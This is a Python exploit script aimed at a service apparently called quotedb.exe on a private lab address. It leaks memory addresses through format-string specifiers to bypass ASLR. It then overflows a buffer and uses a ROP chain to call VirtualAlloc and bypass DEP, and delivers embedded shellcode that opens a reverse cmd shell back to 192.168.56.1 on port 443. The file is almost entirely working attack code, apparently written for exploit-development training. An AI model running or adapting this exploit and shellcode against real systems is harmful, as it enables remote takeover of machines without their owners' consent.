import socket
from struct import pack
from time import sleep

server = "192.168.56.108"
port = 3700


def aslrBypass(server, port, ):

    server = server
    port = port

    try:
        buf = pack("<L", 0x387)  # OPCode
        buf += pack("<L", 0x6)
        buf += b"%x:" * 0x10

        print("\nUpdating Quote...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))
        s.send(buf)

    except socket.error:
        print("Could not connect!")

        sleep(2)

    try:
        buf = pack("<L", 0x385)  # OPCode
        buf += pack("<L", 0x6)

        print("\nPrinting Quotes...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))
        s.send(buf)

        res = s.recv(1024).decode()
        print(res)
        msvcrtAddr = "0x" + res.split(":")[0]
        msvcrtAddr = int(msvcrtAddr, 16) - 0x66bc0
        quoteDBAddr = "0x" + res.split(":")[2]
        quoteDBAddr = int(quoteDBAddr, 16) - 0x173b
        print("\nmsvcrt.dll = {}".format(hex(msvcrtAddr)))
        print("quotedb.exe = {}".format(hex(quoteDBAddr)))
        return msvcrtAddr, quoteDBAddr
        s.close()

    except socket.error:
        print("Could not connect!")


def triggerOverflow(server, port, msvcrtAddr, quoteDBAddr):

    server = server
    port = port

    try:
        buf = pack("<L", 0x389)  # OPCode
        buf += b"\x01"

        buf += b"A" * 0x80b

        # get ESP into EAX, align with VA
        eip = pack("<L", quoteDBAddr+0x25c0)  # xor eax, eax
        buf += eip

        buf += pack("<L", quoteDBAddr+0x1e69)  # or eax, esp
        buf += pack("<L", quoteDBAddr+0x2b38)  # pop ecx
        buf += pack("<L", 0x134)
        buf += pack("<L", quoteDBAddr+0x9b36)  # add eax, ecx; pop ebx; ret
        buf += pack("<L", 0x41414141)  # junk for ebx

        # Patching VirtualAlloc
        buf += pack("<L", quoteDBAddr+0x1e73)  # mov ebx, eax; ret

        buf += pack("<L", quoteDBAddr+0x2b37)  # pop eax; pop ecx
        vaIAT = quoteDBAddr + 0x43218
        buf += pack("<L", vaIAT)
        buf += pack("<L", 0x41414141)  # junk for ecx
        # mov eax, dword ptr [eax], add ecx, 5; pop edx
        buf += pack("<L", quoteDBAddr+0x1e6c)
        buf += pack("<L", 0x41414141)  # junk for edx

        buf += pack("<L", quoteDBAddr+0x1e7a)  # mov dword ptr [ebx], eax
        buf += pack("<L", quoteDBAddr+0x5306)  # mov eax, ebx; pop ebx; pop esi
        buf += pack("<L", 0x41414141)  # junk for ebx
        buf += pack("<L", 0x41414141)  # junk for esi

        # Patching Return address
        buf += pack("<L", quoteDBAddr+0x9b6d)  # add eax, 4; pop ebx
        buf += pack("<L", 0x41414141)  # junk for ebx

        buf += pack("<L", quoteDBAddr+0x1e73)  # mov ebx, eax; ret

        buf += pack("<L", quoteDBAddr+0x2b38)  # pop ecx; ret
        buf += pack("<L", 0x14)  # +0x94b

        buf += pack("<L", quoteDBAddr+0x1e7d)  # xchg ebx,edx
        buf += pack("<L", quoteDBAddr+0x9b36)  # add eax, ecx; pop ebx; ret;
        buf += pack("<L", 0x41414141)  # junk for ebx
        buf += pack("<L", quoteDBAddr+0x1e7d)  # xchg ebx,edx

        buf += pack("<L", quoteDBAddr+0x1e7a)  # mov dword ptr [ebx], eax
        buf += pack("<L", quoteDBAddr+0x5306)  # mov eax, ebx; pop ebx; pop esi
        buf += pack("<L", 0x41414141)  # junk for ebx
        buf += pack("<L", 0x41414141)  # junk for esi

        # Patching lpAddress

        buf += pack("<L", quoteDBAddr+0x9b6d)  # add eax, 4; pop ebx
        buf += pack("<L", 0x41414141)  # junk for ebx

        buf += pack("<L", quoteDBAddr+0x1e73)  # mov ebx, eax; ret

        buf += pack("<L", quoteDBAddr+0x2b38)  # pop ecx; ret
        buf += pack("<L", 0x10)  # +0x947

        buf += pack("<L", quoteDBAddr+0x1e7d)  # xchg ebx,edx
        buf += pack("<L", quoteDBAddr+0x9b36)  # add eax, ecx; pop ebx; ret;
        buf += pack("<L", 0x41414141)  # junk for ebx
        buf += pack("<L", quoteDBAddr+0x1e7d)  # xchg ebx,edx

        buf += pack("<L", quoteDBAddr+0x1e7a)  # mov dword ptr [ebx], eax
        buf += pack("<L", quoteDBAddr+0x5306)  # mov eax, ebx; pop ebx; pop esi
        buf += pack("<L", 0x41414141)  # junk for ebx
        buf += pack("<L", 0x41414141)  # junk for esi

        # Patching dwSize
        buf += pack("<L", quoteDBAddr+0x9b6d)  # add eax, 4; pop ebx
        buf += pack("<L", 0x41414141)  # junk for ebx

        buf += pack("<L", quoteDBAddr+0x1e73)  # mov ebx, eax; ret

        buf += pack("<L", quoteDBAddr+0x2b37)  # pop eax; pop ecx
        buf += pack("<L", 0x200)
        buf += pack("<L", 0x41414141)  # junk for ecx

        buf += pack("<L", quoteDBAddr+0x1e7a)  # mov dword ptr [ebx], eax
        buf += pack("<L", quoteDBAddr+0x5306)  # mov eax, ebx; pop ebx; pop esi
        buf += pack("<L", 0x41414141)  # junk for ebx
        buf += pack("<L", 0x41414141)  # junk for esi

        # Patching flAllocationType
        buf += pack("<L", quoteDBAddr+0x9b6d)  # add eax, 4; pop ebx
        buf += pack("<L", 0x41414141)  # junk for ebx

        buf += pack("<L", quoteDBAddr+0x1e73)  # mov ebx, eax; ret

        buf += pack("<L", quoteDBAddr+0x2b37)  # pop eax; pop ecx
        buf += pack("<L", 0x1000)
        buf += pack("<L", 0x41414141)  # junk for ecx

        buf += pack("<L", quoteDBAddr+0x1e7a)  # mov dword ptr [ebx], eax
        buf += pack("<L", quoteDBAddr+0x5306)  # mov eax, ebx; pop ebx; pop esi
        buf += pack("<L", 0x41414141)  # junk for ebx
        buf += pack("<L", 0x41414141)  # junk for esi

        # Patching flprotect
        buf += pack("<L", quoteDBAddr+0x9b6d)  # add eax, 4; pop ebx
        buf += pack("<L", 0x41414141)  # junk for ebx

        buf += pack("<L", quoteDBAddr+0x1e73)  # mov ebx, eax; ret

        buf += pack("<L", quoteDBAddr+0x2b37)  # pop eax; pop ecx
        buf += pack("<L", 0x40)
        buf += pack("<L", 0x41414141)  # junk for ecx

        buf += pack("<L", quoteDBAddr+0x1e7a)  # mov dword ptr [ebx], eax
        buf += pack("<L", quoteDBAddr+0x5306)  # mov eax, ebx; pop ebx; pop esi
        buf += pack("<L", 0x41414141)  # junk for ebx
        buf += pack("<L", 0x41414141)  # junk for esi

        # Align ESP with VA structure, trigger
        buf += pack("<L", quoteDBAddr+0x2b38)  # pop ecx; ret
        buf += pack("<L", 0xffffffec)  # -0x16

        buf += pack("<L", quoteDBAddr+0x1e7d)  # xchg ebx,edx
        buf += pack("<L", quoteDBAddr+0x9b36)  # add eax, ecx; pop ebx; ret;
        buf += pack("<L", 0x41414141)  # junk for ebx
        buf += pack("<L", quoteDBAddr+0x1e7d)  # xchg ebx,edx

        buf += pack("<L", quoteDBAddr+0x344d)  # xchg eax, esp; ret

        virtualAlloc = pack("<L", 0x42424242)  # VA addr
        virtualAlloc += pack("<L", 0x43434343)  # Ret Addr
        virtualAlloc += pack("<L", 0x44444444)  # lpAddr
        virtualAlloc += pack("<L", 0x45454545)  # dwSize
        virtualAlloc += pack("<L", 0x46464646)  # flAllocationType
        virtualAlloc += pack("<L", 0x47474747)  # flProtect
        buf += virtualAlloc

        buf += b"\x90" * 0x20
        buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
        buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
        buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
        buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
        buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
        buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
        buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
        buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
        buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
        buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
        buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
        buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
        buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
        buf += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
        buf += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x38\x01\x68"
        buf += b"\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
        buf += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
        buf += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
        buf += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
        buf += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
        buf += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
        buf += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
        buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68"
        buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
        buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
        buf += b"\x90" * 0x20

        print("\nTriggering memory corruption...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))
        s.send(buf)
        print(s.recv(1024))
        s.close()
        print("Done!")

    except socket.error:
        print("Could not connect!")


msvcrtAddr, quoteDBAddr = aslrBypass(server, port)
triggerOverflow(server, port, msvcrtAddr, quoteDBAddr)
